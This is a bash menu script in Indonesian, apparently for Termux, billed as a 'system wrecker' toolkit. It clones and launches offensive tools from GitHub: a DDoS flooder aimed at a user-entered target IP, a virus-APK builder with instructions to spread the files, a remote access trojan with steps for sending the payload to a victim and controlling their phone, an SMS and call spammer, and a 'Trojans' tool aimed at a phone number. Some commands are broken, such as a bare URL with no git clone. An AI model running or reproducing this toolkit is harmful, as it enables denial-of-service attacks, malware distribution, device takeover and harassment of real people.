#usr/bin/bash
clear
# Recode ajh mmnx
echo
echo
#ini paket untuk menjalankan tools
mr.xbots.sh
echo
clear
sleep 1
echo "==========================================="|lolcat
sleep 1
echo  "|AUTHOR   : MR.XBOTS                     |"|lolcat
sleep 1
echo  "|WA       : 08814679274                  |"|lolcat
sleep 1
echo  "|IG.      : Pandark00                    |"|lolcat
sleep 1
echo  "|TOOLS    : pengrusak sistem             |"|lolcat
sleep 1
echo "==========================================="|lolcat
sleep 1
echo
sleep 1 
echo  "====================="|lolcat
echo  "[ 1 ] DDOS HAMMER"|lolcat
echo  "[ 2 ] VBUG"|lolcat
echo  "[ 3 ] A-Rat"|lolcat
echo  "[ 4 ] Spam"|lolcat
echo  "[ 5 ] Trojans"|lolcat
echo  "[ 6 ] Exit"|lolcat
echo  "====================="|lolcat
read -p "=====> " pil; 

if [ $pil = 1 ]
then
clear
pkg install python
clear
echo "========================================"|lolcat
sleep 1
echo  "|AUTHOR   : MR.XBOTS                  |"|lolcat
sleep 1
echo  "|WA       : 08814679274               |"|lolcat
sleep 1
echo  "|IG.      : Pandark00                 |"|lolcat
sleep 1
echo  "|TOOLS    : DDOS HAMMER               |"|lolcat
sleep 1
echo "========================================"|lolcat
echo
echo
echo
echo "YAKIN INGIN MELANJUTKAN Y"|lolcat
read -p "~~~~~~ " dd; 
fi

if [ $dd = y ]
then
clear
echo
echo "========================================"|lolcat
sleep 1
echo  "|AUTHOR   : MR.XBOTS                  |"|lolcat
sleep 1
echo  "|WA       : 08814679274               |"|lolcat
sleep 1
echo  "|IG.      : Pandark00                 |"|lolcat
sleep 1
echo  "|TOOLS    : DDOS HAMMER               |"|lolcat
sleep 1
echo "========================================"|lolcat
echo
echo
echo
echo
echo "#######################"|lolcat
echo "[ 1 ] DDOS SEKARANG"|lolcat
echo "[ 2 ] DAPATKAN IP WEB"|lolcat
echo "#######################"|lolcat
echo
echo
echo "KETIK PILIHAN"|lolcat
read -p ">>>>>>>>> " os; 
fi


if [ $os = 1 ]
then
clear
echo "========================================"|lolcat
sleep 1
echo  "|AUTHOR   : MR.XBOTS                  |"|lolcat
sleep 1
echo  "|WA       : 08814679274               |"|lolcat
sleep 1
echo  "|IG.      : Pandark00                 |"|lolcat
sleep 1
echo  "|TOOLS    : DDOS HAMMER               |"|lolcat
sleep 1
echo "========================================"|lolcat
echo
echo
echo
echo
read -p "MASUKAN IP TARGET >>>>>> " korban;
mkdir penyimpanan
cd penyimpanan
git clone https://github.com/cyweb/hammer
cd hammer
python hammer.py -s $korban -p 80 -t 135
fi

if [ $os = 2 ]
then
clear
echo "=========================================="|lolcat
sleep 1
echo  "|AUTHOR   : MR.XBOTS                    |"|lolcat
sleep 1  
echo  "|WA       : 08814679274                 |"|lolcat
sleep 1
echo  "|IG.      : Pandark00                   |"|lolcat
sleep 1
echo  "|TOOLS    : DAPATKAN IP WEB             |"|lolcat
sleep 1
echo "=========================================="|lolcat
echo
echo
echo
echo "MASUKAN NAMA WEB CONTOH GOOGLE.com"|lolcat
read -p ">>>>>>>> " wb; 
ping $wb
echo
echo "KETIK Y UNTUK DDOS KETIK N UNTUK STOP"|lolcat
read -p ">>>>>>>> " ln; 
fi


if [ $ln = y ]
then
clear
echo "========================================"|lolcat
sleep 1
echo  "|AUTHOR   : MR.XBOTS                  |"|lolcat
sleep 1
echo  "|WA       : 08814679274               |"|lolcat
sleep 1
echo  "|IG.      : Pandark00                 |"|lolcat
sleep 1
echo  "|TOOLS    : DDOS HAMMER               |"|lolcat
sleep 1
echo "========================================"|lolcat
echo
echo
echo
echo
read -p "MASUKAN IP TARGET >>>>>> " korban;
mkdir penyimpanan
cd penyimpanan
git clone https://github.com/cyweb/hammer
cd hammer
python hammer.py -s $korban -p 80 -t 135
fi


if [ $pil = 2 ]
then
clear
echo "========================================"|lolcat
sleep 1
echo  "|AUTHOR   : MR.XBOTS                  |"|lolcat
sleep 1
echo  "|WA       : 08814679274               |"|lolcat
sleep 1
echo  "|IG.      : Pandark00                 |"|lolcat
sleep 1
echo  "|TOOLS    : VBUG                      |"|lolcat
sleep 1
echo "========================================"|lolcat
echo
echo
echo "==============================="|lolcat
echo "[ 1 ] BUAT APK VIRUS"|lolcat
echo "[ 2 ] pindahkan virus ke sdcard"|lolcat
echo "[ 3 ] EXIT"|lolcat
echo "==============================="|lolcat
read -p "}}}}}} " no; 
fi

if [ $no = 1 ]
then
clear
figlet -f slant "INSTAL KEPERLUAN"|lolcat
pkg install python2
mkdir penyimpanan
cd penyimpanan
git clone https://github.com/Junior60/vbug.git
cd vbug
python2 vbug.py
fi

if [ $no = 2 ]
then
clear
echo "============================================"|lolcat
sleep 1
echo  "|AUTHOR   : MR.XBOTS                      |"|lolcat
sleep 1
echo  "|WA       : 08814679274                   |"|lolcat
sleep 1
echo  "|IG.      : Pandark00                     |"|lolcat
sleep 1
echo  "|TOOLS    : CEK VIRUS                     |"|lolcat
sleep 1
echo "============================================"|lolcat
echo
echo
echo
echo
sleep 0.3
echo "================================="|lolcat
sleep 0.3
echo " [ 1 ] Buka sdcard"|lolcat
sleep 0.3
echo " [ 2 ] Cari folder vbug"|lolcat
sleep 0.3
echo " [ 3 ] Buka foldef vbug"|lolcat
sleep 0.3
echo " [ 4 ] Cari virus berbentuk apk"|lolcat
sleep 0.3
echo " [ 5 ] Sebarkan"|lolcat
sleep 0.3
echo "================================="|lolcat
cd vbug
cd virus
ls
fi

if [ $no = 3 ]
then
figlet -f slant "E X I T"|lolcat
sleep 0.5
exit
fi


if [ $pil = 3 ]
then
clear
echo  "============================================"|lolcat
sleep 1
echo  "|AUTHOR   : MR.XBOTS                      |"|lolcat
sleep 1
echo  "|WA       : 08814679274                   |"|lolcat
sleep 1
echo  "|IG.      : Pandark00                     |"|lolcat
sleep 1
echo  "|TOOLS    : A-Rat                         |"|lolcat
sleep 1
echo  "============================================"|lolcat
echo
echo
echo
echo "============================================================================"|lolcat
echo "[ 1 ] saat sudah masuk ke A-Rat ketik"|lolcat
echo "[ 2 ] set PORT 1337"|lolcat
echo "[ 3 ] set HOST 127.0.0.1"|lolcat
echo "[ 4 ] set OUTPUT /sdcard/nama sc yang kalian inginkan.py"|lolcat
echo "[ 5 ] generate"|lolcat
echo "[ 6 ] untuk mengaktifkan nya ketik"|lolcat
echo "[ 7 ] set PORT 1337"|lolcat
echo "[ 8 ] set HOST 127.0.0.1"|lolcat
echo "[ 9 ] run"|lolcat
echo "[ 10 ] cari sc di sdcard lalu kirim ke target"|lolcat
echo "[ 11 ] jika target sudah menggunakan sc nya"|lolcat
echo "[ 12 ] kita bisa kendalikan hp nya untuk mengetahui fungsinya apa saja ketik"|lolcat
echo "[ 13 ] help"|lolcat
echo "[ 14 ] E N J O Y"|lolcat
echo "============================================================================"
echo
echo 
echo
echo "Y untuk melanjutkan"|lolcat
read -p ">>>>>> " nomber; 
fi


if [ $nomber = y ]
then
clear
figlet -f slant "INSTAL KEPERLUAN"|lolcat
pkg install python2
mkdir penyimpanan
cd penyimpanan
git clone https://github.com/Xi4u7/A-Rat.git
cd A-Rat
python2 A-Rat.py
fi


if [ $pil = 6 ]
then
figlet -f slant "E X I T"|lolcat
sleep 0.5
exit
fi

if [ $pil = 4 ]
then
clear
echo "===================================================="|lolcat
sleep 1
echo  "|AUTHOR   : MR.XBOTS                              |"|lolcat
sleep 1
echo  "|WA       : 08814679274                           |"|lolcat
sleep 1
echo  "|IG.      : Pandark00                             |"|lolcat
sleep 1
echo  "|TOOLS    : Troll_project                         |"|lolcat
sleep 1
echo "===================================================="|lolcat
echo
echo
echo
echo
echo "==================================================="|lolcat
echo "[ 1 ] Ketik Y jika ingin melanjutkan"|lolcat
echo "[ 2 ] Jika sudah masuk ke troll_project masukan nama anda"|lolcat
echo "[ 3 ] Ketik Y"|lolcat
echo "[ 4 ] Pilih salah satu pilihan spam tlp/sms"|lolcat
echo "[ 5 ] Masukan nomber target"|lolcat
echo "[ 6 ] Masukan jumlah jika menggunakan spam sms"|lolcat
echo "[ 7 ] ENJOY"|lolcat
echo "==================================================="|lolcat
echo
echo
echo
echo "ketik Y untuk melanjutkan"|lolcat
read -p ">>>>>> " yn; 
fi

if [ $yn = y ]
then
clear
figlet -f slant "INSTALL KEPERLUAN"|lolcat
pkg install curl
mkdir penyimpanan
cd penyimpanan
git clone https://github.com/zlucifer/troll_project.git
cd troll_project
bash troll.sh
fi

if [ $pil = 5 ]
then
clear
echo "===================================================="|lolcat
sleep 1
echo  "|AUTHOR   : MR.XBOTS                              |"|lolcat
sleep 1
echo  "|WA       : 08814679274                           |"|lolcat
sleep 1
echo  "|IG.      : Pandark00                             |"|lolcat
sleep 1
echo  "|TOOLS    : Trojans                               |"|lolcat
sleep 1
echo "===================================================="|lolcat
echo
echo
echo
echo "    ##cara menggunakan##"|lolcat
echo "[ 1 ] Masuk ke sc"|lolcat
echo "[ 2 ] isikan nomber target"|lolcat
echo "[ 3 } enjoy"|lolcat
echo
echo
echo "ketik y untuk lanjut"
read -p ">>>>>> " tai; 
fi

if [ $tai = y ]
then
clear
mkdir penyimpanan 
cd penyimpanan 
figlet -f slant "install" |lolcat
https://github.com/pashayogi/Trojans.git
cd Trojans
python2 trojans.py
fi

